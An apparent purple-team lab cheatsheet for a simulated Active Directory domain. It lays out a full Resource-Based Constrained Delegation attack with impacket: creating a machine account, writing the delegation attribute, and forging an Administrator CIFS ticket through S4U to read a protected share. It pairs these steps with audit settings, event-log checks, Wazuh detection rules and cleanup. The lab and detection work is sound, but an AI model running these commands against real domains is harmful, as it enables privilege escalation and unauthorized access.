# RBCD Command Cheatsheet

## Variables

```bash
DOMAIN='SIMULATION.LOCAL'
DC_IP='<DC_IP>'
TARGET_IP='<OTDC01_IP>'
USER='sofia.bennett'
ATTACKER='RBCDCLIENT$'
TARGET='OTDC01$'
```

## 1. Check computer-account quota

```powershell
Get-ADObject (Get-ADDomain).DistinguishedName -Properties ms-DS-MachineAccountQuota | Select-Object -ExpandProperty ms-DS-MachineAccountQuota
```

## 2. Check Sofia permission over OTDC01

```powershell
(Get-Acl 'AD:\CN=OTDC01,CN=Computers,DC=SIMULATION,DC=LOCAL').Access | Where-Object IdentityReference -match 'sofia.bennett'
```

Expected:

```text
ActiveDirectoryRights: GenericWrite
AccessControlType: Allow
```

## 3. Check RBCD attribute before attack

```powershell
Get-ADComputer OTDC01 -Properties msDS-AllowedToActOnBehalfOfOtherIdentity | Select-Object Name,msDS-AllowedToActOnBehalfOfOtherIdentity
```

## 4. Enable required auditing

```powershell
auditpol.exe /set /subcategory:'Directory Service Changes' /success:enable
```

```powershell
auditpol.exe /set /subcategory:'Computer Account Management' /success:enable /failure:enable
```

```powershell
auditpol.exe /set /subcategory:'Kerberos Service Ticket Operations' /success:enable /failure:enable
```

On OTDC01:

```powershell
auditpol.exe /set /subcategory:'Logon' /success:enable /failure:enable
```

## 5. Baseline protected-share access

```bash
impacket-smbclient "$DOMAIN/$USER@$TARGET_IP"
```

Inside SMB client:

```text
use RBCD-Target$
ls
```

Expected before RBCD:

```text
STATUS_ACCESS_DENIED
```

## 6. Create attacker-controlled computer

```bash
impacket-addcomputer -computer-name "$ATTACKER" -computer-pass '<MACHINE_PASSWORD>' -dc-ip "$DC_IP" -method SAMR "$DOMAIN/$USER:<SOFIA_PASSWORD>"
```

## 7. Verify machine account

```powershell
Get-ADComputer RBCDCLIENT -Properties Enabled,ms-DS-CreatorSID | Select-Object SamAccountName,Enabled,ms-DS-CreatorSID
```

## 8. Verify Event 4741

```powershell
Get-WinEvent -FilterHashtable @{LogName='Security';Id=4741;StartTime=(Get-Date).AddMinutes(-10)} | Select-Object TimeCreated,RecordId,Message
```

Historical record:

```text
21904
```

## 9. Write RBCD delegation

```bash
impacket-rbcd -delegate-from "$ATTACKER" -delegate-to "$TARGET" -action write -dc-ip "$DC_IP" "$DOMAIN/$USER:<SOFIA_PASSWORD>"
```

## 10. Verify RBCD attribute

```powershell
Get-ADComputer OTDC01 -Properties msDS-AllowedToActOnBehalfOfOtherIdentity | Select-Object Name,msDS-AllowedToActOnBehalfOfOtherIdentity
```

## 11. Verify Event 5136

```powershell
Get-WinEvent -FilterHashtable @{LogName='Security';Id=5136;StartTime=(Get-Date).AddMinutes(-10)} | Where-Object Message -match 'msDS-AllowedToActOnBehalfOfOtherIdentity' | Select-Object TimeCreated,RecordId,Message
```

Historical record:

```text
21914
```

## 12. Request Administrator CIFS ticket

```bash
mkdir -p /tmp/rbcd && chmod 700 /tmp/rbcd && cd /tmp/rbcd
```

```bash
impacket-getST -spn 'cifs/OTDC01.SIMULATION.LOCAL' -impersonate Administrator -dc-ip "$DC_IP" "$DOMAIN/$ATTACKER:<MACHINE_PASSWORD>"
```

## 13. Select generated ticket

```bash
export KRB5CCNAME='/tmp/rbcd/Administrator@cifs_OTDC01.SIMULATION.LOCAL@SIMULATION.LOCAL.ccache'
```

## 14. Verify ticket

```bash
klist
```

## 15. Access protected share with delegated ticket

```bash
impacket-smbclient -k -no-pass -dc-ip "$DC_IP" -target-ip "$TARGET_IP" "$DOMAIN/Administrator@OTDC01.SIMULATION.LOCAL"
```

Inside SMB client:

```text
use RBCD-Target$
ls
cat readme.txt
```

Historical result:

```text
RBCD_ACCESS=SUCCESS
```

## 16. Verify S4U Events 4769

```powershell
Get-WinEvent -FilterHashtable @{LogName='Security';Id=4769;StartTime=(Get-Date).AddMinutes(-10)} | Where-Object Message -match 'RBCDCLIENT|OTDC01' | Select-Object TimeCreated,RecordId,Message
```

Historical records:

```text
21920 — S4U2Self
21921 — S4U2Proxy
```

## 17. Verify target Event 4624

Run on OTDC01:

```powershell
Get-WinEvent -FilterHashtable @{LogName='Security';Id=4624;StartTime=(Get-Date).AddMinutes(-10)} | Where-Object Message -match 'Administrator' | Select-Object TimeCreated,RecordId,Message
```

Historical record:

```text
4066
```

## 18. Wazuh filters

```text
data.win.system.eventRecordID:(21904 OR 21914 OR 21920 OR 21921)
```

```text
rule.id:(100430 OR 100431 OR 100432 OR 100433 OR 100434 OR 100436)
```

## 19. Deploy RBCD rules

```bash
sudo install -o root -g wazuh -m 0640 rules/rbcd_detection.xml /var/ossec/etc/rules/rbcd_detection.xml
```

```bash
sudo /var/ossec/bin/wazuh-analysisd -t
```

```bash
sudo systemctl restart wazuh-manager
```

```bash
systemctl is-active wazuh-manager
```

## 20. Cleanup RBCD delegation later

```bash
impacket-rbcd -delegate-from "$ATTACKER" -delegate-to "$TARGET" -action remove -dc-ip "$DC_IP" "$DOMAIN/$USER:<SOFIA_PASSWORD>"
```

## 21. Delete attacker computer later

```powershell
Remove-ADComputer RBCDCLIENT -Confirm:$false
```

## 22. Delete ticket material later

```bash
rm -rf /tmp/rbcd
```

```bash
unset KRB5CCNAME
```
